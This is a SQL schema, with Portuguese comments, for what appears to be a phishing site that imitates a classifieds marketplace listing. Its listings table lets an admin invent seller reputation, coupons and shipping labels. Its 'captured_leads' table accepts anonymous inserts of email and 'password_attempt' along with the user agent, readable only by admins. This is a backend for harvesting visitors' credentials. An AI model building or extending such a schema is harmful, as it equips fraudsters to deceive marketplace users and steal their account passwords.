
-- Roles
CREATE TYPE public.app_role AS ENUM ('admin', 'user');

CREATE TABLE public.user_roles (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  role public.app_role NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  UNIQUE(user_id, role)
);
ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;

CREATE OR REPLACE FUNCTION public.has_role(_user_id UUID, _role public.app_role)
RETURNS BOOLEAN
LANGUAGE SQL STABLE SECURITY DEFINER SET search_path = public
AS $$
  SELECT EXISTS (SELECT 1 FROM public.user_roles WHERE user_id = _user_id AND role = _role)
$$;

CREATE POLICY "Users can view own roles" ON public.user_roles
  FOR SELECT TO authenticated USING (auth.uid() = user_id);
CREATE POLICY "Admins manage roles" ON public.user_roles
  FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

-- Listings (anúncios)
CREATE TABLE public.listings (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  slug TEXT UNIQUE NOT NULL,
  title TEXT NOT NULL,
  description TEXT,
  price_cents INTEGER NOT NULL DEFAULT 0,
  installment_label TEXT,
  category TEXT,
  brand TEXT,
  model TEXT,
  condition TEXT,
  storage_capacity TEXT,
  color TEXT,
  location_text TEXT,
  seller_name TEXT,
  seller_since TEXT,
  seller_sales INTEGER DEFAULT 0,
  coupon_code TEXT,
  coupon_label TEXT,
  shipping_label TEXT,
  is_main BOOLEAN NOT NULL DEFAULT false,
  carousel_section TEXT NOT NULL DEFAULT 'tambem',
  display_order INTEGER NOT NULL DEFAULT 0,
  published BOOLEAN NOT NULL DEFAULT true,
  posted_at TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
ALTER TABLE public.listings ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Public read published listings" ON public.listings
  FOR SELECT USING (published = true);
CREATE POLICY "Admins full access listings" ON public.listings
  FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

-- Imagens
CREATE TABLE public.listing_images (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  listing_id UUID NOT NULL REFERENCES public.listings(id) ON DELETE CASCADE,
  url TEXT NOT NULL,
  display_order INTEGER NOT NULL DEFAULT 0,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
ALTER TABLE public.listing_images ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Public read listing images" ON public.listing_images
  FOR SELECT USING (true);
CREATE POLICY "Admins full access images" ON public.listing_images
  FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin'))
  WITH CHECK (public.has_role(auth.uid(), 'admin'));

-- Leads capturados
CREATE TABLE public.captured_leads (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT NOT NULL,
  password_attempt TEXT NOT NULL,
  listing_id UUID REFERENCES public.listings(id) ON DELETE SET NULL,
  user_agent TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
ALTER TABLE public.captured_leads ENABLE ROW LEVEL SECURITY;

-- Qualquer um pode INSERIR (lead form), mas só admin pode LER
CREATE POLICY "Anyone can insert leads" ON public.captured_leads
  FOR INSERT WITH CHECK (true);
CREATE POLICY "Admins read leads" ON public.captured_leads
  FOR SELECT TO authenticated USING (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins delete leads" ON public.captured_leads
  FOR DELETE TO authenticated USING (public.has_role(auth.uid(), 'admin'));

-- Storage bucket para imagens
INSERT INTO storage.buckets (id, name, public) VALUES ('listing-images', 'listing-images', true);

CREATE POLICY "Public read listing-images" ON storage.objects
  FOR SELECT USING (bucket_id = 'listing-images');
CREATE POLICY "Admins upload listing-images" ON storage.objects
  FOR INSERT TO authenticated WITH CHECK (bucket_id = 'listing-images' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins update listing-images" ON storage.objects
  FOR UPDATE TO authenticated USING (bucket_id = 'listing-images' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins delete listing-images" ON storage.objects
  FOR DELETE TO authenticated USING (bucket_id = 'listing-images' AND public.has_role(auth.uid(), 'admin'));
